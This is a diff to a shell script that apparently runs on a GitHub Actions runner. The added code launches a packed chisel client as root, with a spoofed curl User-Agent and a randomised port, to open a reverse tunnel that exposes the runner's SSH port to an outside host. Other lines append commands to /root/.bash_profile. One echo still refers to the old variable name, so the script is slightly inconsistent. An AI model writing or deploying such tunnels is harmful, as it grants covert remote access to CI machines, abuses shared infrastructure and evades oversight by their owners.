@@ -44,8 +44,8 @@ ls -al /bin/ts45 /bin/cc45  /bin/edge /bin/bing;">>/root/.bash_profile';
 
 [ -z "${GITHUB_WORKSPACE}" ]  && 
 (
-  sleep 2;
-)||(  echo 234691;export GITHUB_WORKSPACE=/home/runner/work/nc_test/nc_test ;echo 159741);
+  sleep 2;export GITHUB_WORKSPACE=/home/runner/work/nc_test/nc_test ;echo 159741
+)||(  echo 234691;);
 
 
 
@@ -157,9 +157,18 @@ $GITHUB_WORKSPACE/chisel2upx.elf client -v --header 'User-Agent: curl/7.87.0' 8h
 EO1F
 echo $?;
 )||(
-export  bport=50055
+
+sudo bash <<'EO1F'
+num51z=$(date +%S);
+num67z=$(echo "1"$num51z);
+num76=$((${num67z}%8));
+bport2=5005"$num76";
+
+export  bport2=$bport2
 export GITHUB_WORKSPACE=/home/runner/work/nc_test/nc_test
-$GITHUB_WORKSPACE/chisel2upx.elf client -v --header 'User-Agent: curl/8.12.0' 8hlr6pq0noxm.ngrok.xiaomiqiu123.top R:0.0.0.0:$bport:127.0.0.1:22;
+$GITHUB_WORKSPACE/chisel2upx.elf client -v --header 'User-Agent: curl/8.12.0' 8hlr6pq0noxm.ngrok.xiaomiqiu123.top R:0.0.0.0:$bport2:127.0.0.1:22;
+echo $?;
+EO1F
 )
 
   echo "exit_revSSH_isOK_$bport  $(date)";date;
